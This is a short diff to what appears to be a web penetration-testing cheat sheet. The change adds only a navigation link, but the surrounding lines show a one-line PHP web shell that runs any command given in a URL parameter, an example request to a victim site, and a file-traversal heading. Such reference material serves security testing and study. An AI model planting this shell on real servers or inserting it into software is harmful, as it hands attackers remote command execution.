@@ -27,6 +27,7 @@ PHP Web Shell
 <?php echo(system($_GET["cmd"])); ?>
 ```
 - Go to http://victimsite.com/test.php?cmd=dir for command execution 
+[Back](#summary)
 
 ## File Traversal / Local File Inclusion
 * Use \~1 with filenames and spaces
